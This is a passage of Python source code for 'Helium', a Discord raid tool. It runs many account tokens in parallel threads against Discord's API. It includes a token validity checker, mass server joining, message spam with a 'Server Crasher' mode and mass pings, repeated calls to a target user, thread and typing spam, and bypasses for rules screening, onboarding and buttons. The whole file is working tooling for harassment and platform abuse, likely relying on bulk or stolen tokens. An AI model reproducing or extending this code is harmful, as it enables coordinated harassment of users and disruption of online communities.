            if close:
                ws.close()
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def token_checker(self):
        valid = []

        def main(token):
            while True:
                try:
                    response = session.get(
                        "https://canary.discord.com/api/v9/users/@me/billing/payment-sources",
                        headers=self.headers(token),
                    )
                    match response.status_code:
                        case 200:
                            console.log("VALID", C["green"], token[:25])
                            valid.append(token)
                            break
                        case 403:
                            console.log("LOCKED", C["yellow"], token[:25])
                            break
                        case 429:
                            retry_after = response.json().get('retry_after')
                            console.log("RATELIMITED", C["pink"], token[:25], f"{retry_after}s")
                            time.sleep(retry_after)
                        case _:
                            console.log(
                                "INVALID",
                                C["red"],
                                token[:25],
                                response.json().get("message"),
                            )
                            break
                    with open("data/tokens.txt", "w") as f:
                        f.write("\n".join(valid))
                except Exception as e:
                    console.log("FAILED", C["red"], token[:25], e)
                    break

        args = [
            (token, ) for token in tokens
        ]
        Menu().run(main, args)
        
    def reactor_main(self, channel_id, message_id):
        try:
            access_token = []
            emojis = []

            params = {
                "around": message_id, 
                "limit": 50
            }
            Clear()
            console.render_ascii()

            for token in tokens:
                response = session.get(
                    f"https://canary.discord.com/api/v9/channels/{channel_id}/messages",
                    headers=self.headers(token),
                    params=params,
                )

                match response.status_code:
                    case 200:
                        access_token.append(token)
                        break

            if not access_token:
                console.log("Failed", C["red"], "Missing Permissions")
                Menu().main_menu(True)
            else:
                data = response.json()
                for __ in data:
                    if __["id"] == message_id:
                        reactions = __["reactions"]
                        for emois in reactions:
                            if emois:
                                emoji_id = emois["emoji"]["id"]
                                emoji_name = emois["emoji"]["name"]

                                if emoji_id is None:
                                    emojis.append(emoji_name)
                                else:
                                    emojis.append(f"{emoji_name}:{emoji_id}")
                            else:
                                console.log("Failed", C["red"], "No reactions Found in this message",)
                                Menu().main_menu(True)

                for i, emoji in enumerate(emojis, start=1):
                    print(f"{C['light_blue']}0{i}:{C['white']} {emoji}")

                choice = input(f"\n{console.prompt('Choice')}")
                selected = emojis[int(choice) - 1]

            def add_reaction(token):
                try:
                    url = f"https://canary.discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{selected}/@me"

                    if emoji_id is None:
                        url += "?location=Message&type=0"
                    response = session.put(url, headers=self.headers(token))

                    match response.status_code:
                        case 204:
                            console.log("Reacted", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", selected)
                        case _:
                            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                except Exception as e:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

            args = [
                (token,) for token in tokens
            ]
            Menu().run(add_reaction, args)

        except Exception as e:
            console.log("FAILED", C["red"], "Failed to get emojis", e)
            Menu().main_menu(True)

            def add_reaction(token):
                try:
                    url = f"https://canary.discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{selected}/@me"

                    if emoji_id is None:
                        url += "?location=Message&type=0"
                    response = session.put(url, headers=self.headers(token))

                    match response.status_code:
                        case 204:
                            console.log("REACTED", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", selected)
                        case _:
                            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                except Exception as e:
                    console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

            args = [
                (token) for token in tokens
            ]
            Menu().run(add_reaction, args)

    def soundbord(self, token, channel, sounds):
        try:
            time.sleep(1)
            while True:
                sound = random.choice(sounds)

                name = sound.get("name")

                json_data = {
                    "emoji_id": None,
                    "emoji_name": sound.get("emoji_name"),
                    "sound_id": sound.get("sound_id"),
                }

                response = session.post(
                    f'https://canary.discord.com/api/v9/channels/{channel}/send-soundboard-sound', 
                    headers=self.headers(token), 
                    json=json_data,
                )

                match response.status_code:
                    case 204:
                        print(f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}]{Fore.LIGHTCYAN_EX} Successfully played sound {Fore.YELLOW}{name} {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                    case 429:
                        retry_after = response.json().get("retry_after")
                        console.log("RATELIMIT", Fore.LIGHTYELLOW_EX, f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after}s",)
                        time.sleep(float(retry_after))
                    case _:
                        print(f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] {Fore.RED}Failed to play sound {Fore.YELLOW}{name} {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
        except Exception as e:
            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def open_dm(self, token, user_id):
        try:
            payload = {
                "recipients": [user_id]
            }

            response = session.post(
                "https://canary.discord.com/api/v9/users/@me/channels",
                headers=self.headers(token),
                json=payload,
            )

            match response.status_code:
                case 200:
                    return response.json()["id"]
                case _:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                    return
        except Exception as e:
            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def call_spammer(self, token, user_id):
        try:
            while True:
                channel_id = self.open_dm(token, user_id)

                response = session.get(
                    f"https://canary.discord.com/api/v9/channels/{channel_id}/call",
                    headers=self.headers(token),
                )

                match response.status_code:
                    case 200:
                        console.log("Called", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", user_id)
                        ws = websocket.WebSocket()
                        self.voice_spammer(token, ws, None, channel_id, True)
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                        return
                time.sleep(5)
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def format_tokens(self):
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()

        try:
            formatted = []

            for token in tokens:
                token = token.strip()

                if token:
                    tokens_split = token.split(":")
                    if len(tokens_split) >= 3:
                        formatted_token = tokens_split[2]
                        formatted.append(formatted_token)
                    else:
                        formatted.append(token)

            console.log("SUCCESS", C["green"], f"Formatted {len(formatted)} tokens")

            with open("data/tokens.txt", "w") as f:
                for token in formatted:
                    f.write(f"{token}\n")
            Menu().main_menu()
        except Exception as e:
            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def button_bypass(self, token, message_id, channel_id, guild_id, optionbutton):
        try:
            payload = {
                'limit': '50',
                'around': message_id,
            }

            response = session.get(
                f'https://canary.discord.com/api/v9/channels/{channel_id}/messages',
                params=payload,
                headers=self.headers(token),
            )

            messages = response.json()
            messagebottoclick = next((x for x in messages if x["id"] == message_id), None)

            if messagebottoclick is None:
                pass

            buttons = []

            for x in messagebottoclick["components"]:
                buttons.append(x["components"][0])

            data = {
                'type': 3,
                'nonce': '',
                'guild_id': guild_id,
                'channel_id': channel_id,
                'message_flags': 0,
                'message_id': message_id,
                'application_id': messagebottoclick["author"]["id"],
                'session_id': uuid.uuid4().hex,
                'data': {
                    'component_type': 2,
                    'custom_id': buttons[int(optionbutton)]["custom_id"],
                },
            }

            responseq = session.post(
                'https://canary.discord.com/api/v9/interactions',
                headers=self.headers(token),
                json=data,
            )

            match responseq.status_code:
                case 200:
                    print(f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] {Fore.RESET}[{Fore.GREEN}Success{Fore.RESET}] {Fore.RESET} {token[:25]}.{Fore.LIGHTCYAN_EX}**")
                case _:
                    print(f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] {Fore.RESET}[{Fore.RED}Failed{Fore.RESET}] {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
        except Exception as e:
            console.log("FAILED", C["red"], "Failed to Click Button", e)

    def accept_rules(self, guild_id):
        try:
            valid = []
            for token in tokens:
                value = session.get(
                    f"https://canary.discord.com/api/v9/guilds/{guild_id}/member-verification",
                    headers=self.headers(token),
                )

                match value.status_code:
                    case 200:
                        valid.append(token)
                        payload = value.json()
                        break

            if not valid:
                console.log("FAILED", C["red"], "All tokens are Invalid")
                Menu().main_menu(True)

        except Exception as e:
            console.log("FAILED", C["red"], "Failed to Accept Rules", e)

        def run_main(token):
            try:
                response = session.put(
                    f"https://canary.discord.com/api/v9/guilds/{guild_id}/requests/@me",
                    headers=self.headers(token),
                    json=payload,
                )
                
                match response.status_code:
                    case 201:
                        console.log("ACCEPTED", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
            except Exception as e:
                console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

        args = [(token, ) for token in tokens]
        Menu().run(run_main, args)

    def guild_checker(self, guild_id):

        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        
        in_guild = []

        def main_checker(token):
            try:
                response = session.get(
                    f"https://discord.com/api/v9/guilds/{guild_id}",
                    headers=self.headers(token),
                )

                match response.status_code:
                    case 200:
                        console.log("Found", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                        in_guild.append(token)
                    case 429:
                        retry_after = response.json().get("retry_after")
                        console.log("RATELIMIT", Fore.LIGHTYELLOW_EX, f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after}s",)
                        time.sleep(float(retry_after))
                    case _:
                        console.log("Not Found", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                with open("data/tokens.txt", "w") as f:
                    f.write("\n".join(in_guild))
            except Exception as e:
                console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

        args = [
            (token, ) for token in tokens
        ]
        Menu().run(main_checker, args)

    def bio_changer(self, token, bio):
        try:
            payload = {
                "bio": bio
            }

            response = session.patch(
                "https://discord.com/api/v9/users/@me/profile",
                headers=self.headers(token),
                json=payload,
            )

            match response.status_code:
                case 200:
                    console.log("Changed", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", bio)
                case 429:
                    retry_after = response.json().get("retry_after")
                    console.log("RATELIMIT", Fore.LIGHTYELLOW_EX, f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after}s",)
                    time.sleep(float(retry_after))
                case _:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
        except Exception as e:
            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def mass_nick(self, token, guild, nick):
        try:
            payload = {
                'nick' : nick
            }

            response = session.patch(
                f"https://discord.com/api/v9/guilds/{guild}/members/@me", 
                json=payload, 
                headers=self.headers(token)
            )

            match response.status_code:
                case 200:
                    print(f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] {Fore.RESET}[{Fore.LIGHTCYAN_EX}Success{Fore.RESET}] {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                case 429:
                    retry_after = response.json().get("retry_after")
                    console.log("RATELIMIT", Fore.LIGHTYELLOW_EX, f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after}s",)
                    time.sleep(float(retry_after))
                case _:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def thread_spammer(self, token, channel_id, name):
        try:
            payload = {
                "name": name,
                "type": 11,
                "auto_archive_duration": 4320,
                "location": "Thread Browser Toolbar",
            }

            while True:
                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/threads",
                    headers=self.headers(token),
                    json=payload,
                )

                match response.status_code:
                    case 201:
                        console.log("CREATED", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", name)
                    case 429:
                        retry_after = response.json().get("retry_after")
                        console.log("RATELIMIT", Fore.LIGHTYELLOW_EX, f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after}s",)
                        time.sleep(float(retry_after))
                    case _:
                        console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                        break
        except Exception as e:
            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def inviter(self, token, channel_id):
        try:
            data = {
                "max_age": random.randint(1, 86400),
                "max_uses": 0
            }

            while True:
                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/invites",
                    headers=self.headers(token),
                    json=data
                )

                match response.status_code:
                    case 200:
                        code = response.json().get("code")
                        print(f"{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S')}{Fore.RESET} {Fore.RESET}[{Fore.GREEN}Success{Fore.RESET}] {Fore.LIGHTBLACK_EX}-> {Fore.RESET}Created invite {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}** Invite {Fore.LIGHTBLACK_EX}->  https://discord.gg/{code}")
                    case 429:
                        retry_after = response.json().get("retry_after")
                        console.log("RATELIMIT", Fore.LIGHTYELLOW_EX, f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after}s",)
                        time.sleep(float(retry_after))
                    case _:
                        console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                        break
        except Exception as e:
            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def typier(self, token, channelid):
        try:
            while True:
                response = session.post(
                    f"https://discord.com/api/v9/channels/{channelid}/typing", 
                    headers=self.headers(token)
                )

                match response.status_code: 
                    case 204:
                        print(f"{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S')}{Fore.RESET}    {Fore.RESET}[{Fore.GREEN}Success{Fore.RESET}]   {Fore.LIGHTBLACK_EX}->   {Fore.RESET}Typing {Fore.CYAN}{token[:25]}{Fore.LIGHTBLACK_EX}****{Fore.RESET}")
                        time.sleep(9)
                    case _:
                        console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                        break
        except Exception as e:
            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def friender(self, token, nickname):
        try:
            payload = {
                "username": nickname,
            }

            response = session.post(
                f"https://discordapp.com/api/v9/users/@me/relationships", 
                headers=self.headers(token), 
                json=payload
            )

            match response.status_code:
                case 204:
                    print(f"{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S')}{Fore.RESET} {Fore.RESET}[{Fore.GREEN}Success{Fore.RESET}] {Fore.LIGHTBLACK_EX}-> {Fore.RESET}Sent friend {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                case _:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
        except Exception as e:
            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def onboard_bypass(self, guild_id):
        try:
            onboarding_responses_seen = {}
            onboarding_prompts_seen = {}
            onboarding_responses = []
            in_guild = []

            for _token in tokens:
                response = session.get(
                    f"https://canary.discord.com/api/v9/guilds/{guild_id}/onboarding",
                    headers=self.headers(_token),
                )
                match response.status_code:
                    case 200:
                        in_guild.append(_token)
                        break

            if not in_guild:
                console.log("FAILED", C["red"], "Missing Access")
                Menu().main_menu(True)
            else:
                data = response.json()
                now = int(datetime.now().timestamp())

                for __ in data["prompts"]:
                    onboarding_responses.append(__["options"][-1]["id"])

                    onboarding_prompts_seen[__["id"]] = now

                    for prompt in __["options"]:
                        if prompt:
                            onboarding_responses_seen[prompt["id"]] = now
                        else:
                            console.log(
                                "FAILED",
                                C["red"],
                                "No onboarding in This Server",
                            )
                            Menu().main_menu(True)

        except Exception as e:
            console.log("FAILED", C["red"], "Failed to Pass Onboard", e)
            Menu().main_menu(True)

        def run_task(token):
            try:
                json_data = {
                    "onboarding_responses": onboarding_responses,
                    "onboarding_prompts_seen": onboarding_prompts_seen,
                    "onboarding_responses_seen": onboarding_responses_seen,
                }
                response = session.post(
                    f"https://discord.com/api/v9/guilds/{guild_id}/onboarding-responses",
                    headers=self.headers(token),
                    json=json_data,
                )
                match response.status_code:
                    case 200:
                        console.log("ACCEPTED", C["green"], token[:25])
                    case _:
                        console.log(
                            "FAILED",
                            C["red"],
                            token[:25],
                            response.json().get("message"),
                        )
            except Exception as e:
                console.log("FAILED", C["red"], token[:25], e)

        args = [
            (token,) for token in tokens
        ]
        Menu().run(run_task, args)

        def run_task(token):
            try:
                json_data = {
                    "onboarding_responses": onboarding_responses,
                    "onboarding_prompts_seen": onboarding_prompts_seen,
                    "onboarding_responses_seen": onboarding_responses_seen,
                }

                response = session.post(
                    f"https://discord.com/api/v9/guilds/{guild_id}/onboarding-responses",
                    headers=self.headers(token),
                    json=json_data,
                )

                match response.status_code:
                    case 200:
                        console.log("ACCEPTED", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
            except Exception as e:
                console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

        args = [(token,) for token in tokens]
        Menu().run(run_task, args)

class Menu:
    def __init__(self):
        self.raider = Raider()
        self.options = {
            "1": self.joiner, 
            "2": self.leaver,
            "3": self.spammer, 
            "4": self.checker,
            "5": self.reactor, 
            "6": self.soundbord,
            "7": self.formatter,
            "8": self.button,
            "9": self.accept,
            "10": self.guild,
            "11": self.bio,
            "12": self.onlinq,
            "13": self.voicejoiner,
            "14": self.nick_chang,
            "15": self.thad,
            "16": self.friend,
            "17": self.typierq,
            "18": self.onboard,
            "19": self.caller,
            "20": self.double,
            "21": self.inviter,
            "24": self.exit,
        }

    def main_menu(self, _input=None):
        if _input:
            input()
        console.run()
        choice = input(f"{' '*4}{Fore.LIGHTCYAN_EX}> ")
        
        if choice in self.options:
            console.render_ascii()
            self.options[choice]()
        else:
            self.main_menu()


    def run(self, func, args):
        threads = []
        Clear()
        console.render_ascii()
        for arg in args:
            thread = threading.Thread(target=func, args=arg)
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
        input("\n ~/> press enter to continue ")
        self.main_menu()

    @wrapper
    def soundbord(self):
        os.system('title Helium - Soundboard Spam')
        Link = input(console.prompt("Channel LINK"))
        if Link == "":
            Menu().main_menu()
        if Link.startswith("https://"):
            pass
        else:
            Menu().main_menu()
        channel = Link.split("/")[5]
        guild = Link.split("/")[4]
        Clear()
        console.render_ascii()
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        tokenq = random.choice(tokens)
        sounds = Raider().soundboard_sounds(tokenq)
        for token in tokens:
            threading.Thread(target=self.raider.vc_joiner, args=(token, guild, channel, websocket.WebSocket())).start()
            threading.Thread(target=self.raider.soundbord, args=(token, channel, sounds)).start()

    @wrapper
    def inviter(self):
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        os.system('title Helium - inviter')
        Link = input(console.prompt("Channel LINK"))
        if Link == "":
            Menu().main_menu()
        if Link.startswith("https://"):
            pass
        else:
            Menu().main_menu()
        channel = Link.split("/")[5]
        Clear()
        console.render_ascii()
        args = [
            (token, channel) for token in tokens
        ]
        self.run(self.raider.inviter, args)

    @wrapper
    def double(self):
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        os.system('title Helium - masspanel')
        Link = input(console.prompt("Channel LINK"))
        if Link == "":
            Menu().main_menu()
        if Link.startswith("https://"):
            pass
        else:
            Menu().main_menu()
        Clear()
        console.render_ascii()
        guild = Link.split("/")[4]
        channel = Link.split("/")[5]
        args = [
            (token, guild, channel) for token in tokens
        ]
        self.run(self.raider.masspanel, args)

    @wrapper
    def caller(self):
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        os.system('title Helium - Caller')
        user_id = input(console.prompt("User ID"))
        if user_id == "":
            Menu().main_menu()
        Clear()
        console.render_ascii()
        for token in tokens:
            threading.Thread(target=self.raider.call_spammer, args=(token, user_id)).start()

    @wrapper
    def onlinq(self):
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        os.system('title Helium - Onliner')
        for token in tokens:
            print(f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] {Fore.RESET}[{Fore.GREEN}Onlined{Fore.RESET}] {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
            threading.Thread(target=self.raider.onliner, args=(token, websocket.WebSocket())).start()
        input()
        self.main_menu()

    @wrapper
    def typierq(self):
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        os.system('title Helium - Typer')
        Link = input(console.prompt(f"Channel LINK"))
        if Link == "":
            Menu().main_menu()
        if Link.startswith("https://"):
            pass
        else:
            Menu().main_menu()
        channelid = Link.split("/")[5]
        Clear()
        console.render_ascii()
        args = [
            (token, channelid) for token in tokens
        ]
        self.run(self.raider.typier, args)

    @wrapper
    def friend(self):
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        os.system('title Helium - Friender')
        nickname = input(console.prompt("Nick"))
        if nickname == "":
            Menu().main_menu()
        Clear()
        console.render_ascii()
        args = [
            (token, nickname) for token in tokens
        ]
        self.run(self.raider.friender, args)

    @wrapper
    def nick_chang(self):
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        os.system('title Helium - Nickname Changer')
        nick = input(console.prompt("Nick"))
        if nick == "":
            Menu().main_menu()
        Clear()
        console.render_ascii()
        guild = input(console.prompt("Guild ID"))
        if guild == "":
            Menu().main_menu()
        Clear()
        console.render_ascii()
        args = [
            (token, guild, nick) for token in tokens
        ]
        self.run(self.raider.mass_nick, args)

    @wrapper
    def voicejoiner(self):
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        os.system('title Helium - Voice Joiner')
        Link = input(console.prompt("Channel LINK"))
        if Link == "":
            Menu().main_menu()
        if Link.startswith("https://"):
            pass
        else:
            Menu().main_menu()
        guild = Link.split("/")[4]
        channel = Link.split("/")[5]
        Clear()
        console.render_ascii()
        args = [
            (token, guild, channel, websocket.WebSocket()) for token in tokens
        ]
        self.run(self.raider.vc_joiner, args)

    @wrapper
    def thad(self):
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        os.system('title Helium - Thread Spammer')
        name = input(console.prompt("Name"))
        if name == "":
            Menu().main_menu()
        Clear()
        console.render_ascii()
        Link = input(console.prompt("Channel LINK"))
        if Link == "":
            Menu().main_menu()
        if Link.startswith("https://"):
            pass
        else:
            Menu().main_menu()
        channel_id = Link.split("/")[5]
        Clear()
        console.render_ascii()
        args = [
            (token, channel_id, name) for token in tokens
        ]
        self.run(self.raider.thread_spammer, args)

    @wrapper
    def joiner(self):
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        os.system('title Helium - Joiner')
        invite = input(console.prompt(f"Invite"))
        if invite == "":
            Menu().main_menu()
        invite = invite.replace("https://discord.gg/", "").replace("https://discord.com/invite/", "").replace("discord.gg/", "").replace("https://discord.com/invite/", "").replace(".gg/", "")
        Clear()
        console.render_ascii()
        args = [
            (token, invite) for token in tokens
        ]
        self.run(self.raider.joiner, args)

    @wrapper 
    def leaver(self):
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        os.system('title Helium - Leaver')
        guild = input(console.prompt("Guild ID"))
        if guild == "":
            Menu().main_menu()
        Clear()
        console.render_ascii()
        args = [(token, guild) for token in tokens]
        self.run(self.raider.leaver, args)

    @wrapper
    def spammer(self):
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        os.system('title Helium - Spammer')
        Link = input(console.prompt("Channel LINK"))
        if Link.startswith("https://"):
            pass
        else:
            Menu().main_menu()
        guild_id = Link.split("/")[4]
        channel_id = Link.split("/")[5]
        Clear()
        console.render_ascii()
        emoiyspam = input(console.prompt("Server Crasher", True))
        Clear()
        console.render_ascii()
        if "y" in emoiyspam:
            args = [(token, channel_id, None, None, None, None, True) for token in tokens]
            self.run(self.raider.spammer, args)
        else:
            massping = input(console.prompt("Massping", True))
            Clear()
            console.render_ascii()
            message = input(console.prompt("Message"))
            Clear()
            console.render_ascii()
            if message == "":
                Menu().main_menu()
            if "y" in massping:
                Clear()
                console.render_ascii()
                print(f"{Fore.LIGHTWHITE_EX}Scraping users (this may take a while)...")
                self.raider.member_scrape(guild_id, channel_id)
                Clear()
                console.render_ascii()
                count = input(console.prompt("Pings Amount"))
                if count == "":
                    Menu().main_menu()
                Clear()
                console.render_ascii()
                dyno = input(console.prompt("Dyno Tag", True))
                Clear()
                console.render_ascii()
                if "y" in dyno:
                    args = [(token, guild_id, channel_id, message, count) for token in tokens]
                    self.run(self.raider.dyno_massping, args)
                else:
                    args = [(token, channel_id, message, guild_id, True, count, False) for token in tokens]
                    self.run(self.raider.spammer, args)
            else:
                args = [(token, channel_id, message) for token in tokens]
                self.run(self.raider.spammer, args)

    def checker(self):
        os.system('title Helium - Checker')
        self.raider.token_checker()

    @wrapper
    def reactor(self):
        os.system('title Helium - Reactor')
        message = input(console.prompt("Message Link"))
        if message == "":
            Menu().main_menu()
        if message.startswith("https://"):
            pass
        else:
            Menu().main_menu()
        channel_id = message.split("/")[5]
        message_id = message.split("/")[6]
        Clear()
        console.render_ascii()
        self.raider.reactor_main(channel_id, message_id)

    def formatter(self):
        os.system('title Helium - Formatter')
        self.run(self.raider.format_tokens, [()])
    
    @wrapper
    def button(self):
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        os.system('title Helium - Clicker')
        message = input(console.prompt("Message Link"))
        if message == "":
            Menu().main_menu()
        if message.startswith("https://"):
            pass
        else:
            Menu().main_menu()
        guild_id = message.split("/")[4]
        channel_id = message.split("/")[5]
        message_id = message.split("/")[6]
        Clear()
        console.render_ascii()
        print(f"{Fore.RESET}If there's 1 button {Fore.LIGHTCYAN_EX}press Enter{Fore.RESET}, if you want to click a second button, just type 1 or more.")
        optionbutton = input(f"{Fore.RESET}[{Fore.LIGHTCYAN_EX}Button Option{Fore.RESET}] → ")
        if optionbutton == "":
            optionbutton = 0
        Clear()
        console.render_ascii()
        args = [
            (token, message_id, channel_id, guild_id, optionbutton) for token in tokens
        ]
        self.run(self.raider.button_bypass, args)

    @wrapper
    def accept(self):
        os.system('title Helium - Accept Rules')
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            Menu().main_menu()
        Clear()
        console.render_ascii()
        self.raider.accept_rules(guild_id)

    @wrapper
    def guild(self):
        os.system('title Helium - Guild Checker')
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            Menu().main_menu()
        Clear()
        console.render_ascii()
        self.raider.guild_checker(guild_id)

    @wrapper
    def bio(self):
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        os.system('title Helium - Bio Changer')
        bio = input(console.prompt("Bio"))
        if bio == "":
            Menu().main_menu()
        Clear()
        console.render_ascii()
        args = [
            (token, bio) for token in tokens
        ]
        self.run(self.raider.bio_changer, args)

    @wrapper
    def onboard(self):
        os.system('title Helium - Onboarding Bypass')
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            Menu().main_menu()
        Clear()
        console.render_ascii()
        self.raider.onboard_bypass(guild_id)

    @wrapper
    def exit(self):
        os.system('title Helium - Exit')
        print(f"{Fore.RED}Exiting...")
        time.sleep(2)
        os._exit(0)

if __name__ == "__main__":
    Menu().main_menu()